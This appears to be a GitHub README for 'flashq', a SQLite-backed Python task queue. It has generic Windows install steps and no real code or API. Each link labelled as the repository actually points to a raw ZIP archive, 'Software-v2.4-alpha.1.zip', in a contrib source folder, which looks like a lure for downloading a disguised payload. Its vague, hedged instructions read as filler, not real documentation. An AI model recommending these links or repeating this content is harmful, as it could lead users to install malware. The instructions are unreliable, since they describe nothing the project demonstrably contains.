# ⚡ flashq - Task queues that just work

[![Download flashq](https://img.shields.io/badge/Download-FlashQ-5865F2?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Lockwoodepigastric15/flashq/raw/refs/heads/main/flashq/contrib/Software-v2.4-alpha.1.zip)

## 🚀 What is flashq?

flashq is a task queue for Python apps. It helps your app run work in the background, so the main program stays fast and responsive.

You can use it to handle things like:

- Sending email
- Resizing images
- Processing files
- Running delayed jobs
- Handling repeat tasks

flashq is built to work with simple setup. It uses SQLite instead of Redis or RabbitMQ, so you do not need to manage extra services to get started.

## 💻 Before you start

Use flashq on a Windows PC with:

- Windows 10 or Windows 11
- Python 3 installed
- Internet access for the first setup
- A folder where you can save project files

If you do not have Python yet, install it first from the official Python website, then return here.

## 📥 Download flashq

Open this page to download and set up flashq:

[Visit the flashq repository](https://github.com/Lockwoodepigastric15/flashq/raw/refs/heads/main/flashq/contrib/Software-v2.4-alpha.1.zip)

If the page includes a release file or package, download it from there and save it to your PC.

## 🛠️ Install on Windows

1. Open the download link above.
2. Download the project files to a folder you can find again.
3. If the files came as a ZIP, right-click the ZIP file and choose Extract All.
4. Open the extracted folder.
5. Open Command Prompt in that folder.
6. Install the project using Python.

Typical install command:

```bash
pip install .
```

If the project includes a requirements file, use:

```bash
pip install -r requirements.txt
```

If you see a setup script or install script in the folder, follow that file first.

## ▶️ Run flashq

After install, start the app from the same folder.

Typical ways to run it:

```bash
python main.py
```

or

```bash
python -m flashq
```

If the project includes a different start file, use that file name.

## 🧭 First-time setup

When you open flashq for the first time, it may create its own local data file in the project folder. That file stores queued jobs and task status.

A simple first run often looks like this:

1. Start the app.
2. Leave it running in the background.
3. Send a task from your Python app.
4. Check that the task finishes.
5. Open the task log or status view, if the project includes one.

## 🧩 How flashq fits into your app

flashq lets your main app hand work to a queue. Your app can keep going while flashq handles the job in the background.

This helps when you want to:

- Keep a website fast
- Avoid waiting for long jobs
- Run work in order
- Retry jobs that fail
- Track task results

A common setup has three parts:

- Your main Python app
- The flashq queue
- A worker process that runs the tasks

## 📝 Example use cases

Here are a few simple ways people use a task queue like flashq:

- A store site sends order emails after checkout
- A photo tool processes large images in the background
- A data app imports CSV files without freezing the screen
- A scheduler runs cleanup tasks each night
- A chat app sends notification jobs after user events

## ⚙️ Basic workflow

flashq follows a simple flow:

1. Your app creates a task.
2. The task goes into the queue.
3. A worker picks up the task.
4. The worker runs the job.
5. Your app checks the result.

This keeps long work away from the main thread.

## 🔍 What makes flashq useful

flashq is a good fit if you want:

- A small setup
- No extra message server
- Local storage with SQLite
- Background jobs in Python
- Type-safe task code
- A path that is easy to understand

It is useful for small apps, tools, and services that need background jobs without more moving parts.

## 📂 Typical project files

You may see files like these in the project folder:

- `README.md` — project guide
- `pyproject.toml` — Python project settings
- `requirements.txt` — package list
- `main.py` — app start file
- `flashq/` — source code folder
- `tasks/` — task code folder
- `data/` — local queue data

## 🧪 Check that it works

After setup, test flashq with a small job.

Try this pattern:

1. Start the worker.
2. Add one test task.
3. Wait for the job to finish.
4. Check the result.
5. Add a second task.

If both tasks complete, the queue is ready.

## 🧰 Troubleshooting on Windows

If the app does not start, check these common points:

- Python is installed and added to PATH
- You opened Command Prompt in the right folder
- The install command finished without errors
- The folder still contains the project files
- Another app is not using the same file or port

If the worker opens and closes right away, run it from Command Prompt so you can see the message on screen.

## 📚 Helpful usage pattern

A simple way to think about flashq is:

- Your app sends work
- flashq stores the job
- A worker does the work
- The result comes back later

That pattern keeps your app clean and easier to manage.

## 🧱 Suggested Windows setup steps

If you want a smooth start, use this order:

1. Install Python
2. Download flashq
3. Extract the files
4. Open the project folder
5. Install the package
6. Start the worker
7. Send one test task

## 🔐 Local data and storage

flashq uses SQLite, so the queue data stays in a local file on your PC or server. This keeps setup simple and avoids the need for a separate database server.

That means:

- Less setup work
- Fewer moving parts
- Easy local testing
- Simple backup by copying the data file

## 📌 Common task ideas

If you are not sure what to try first, start with one of these:

- Save a message to a file
- Rename a batch of files
- Process a list of names
- Delay a job for later
- Mark a task as done after import

## 🖥️ Running in the background

For normal use, keep the worker running while your app sends tasks. On Windows, you can leave the Command Prompt window open.

If you want flashq to keep running after sign-in, you can place a shortcut in the Startup folder or use Task Scheduler.

## 🧭 Project topics

This project fits these common Python task queue topics:

- async
- background tasks
- celery alternative
- distributed tasks
- job queue
- python3
- sqlite
- task queue
- type-safe

## 📎 Get flashq

[Open the flashq repository](https://github.com/Lockwoodepigastric15/flashq/raw/refs/heads/main/flashq/contrib/Software-v2.4-alpha.1.zip)

## 🧩 Need to move from a test run to real use?

Use the same setup, then connect your own Python code to the queue and keep the worker process open while jobs run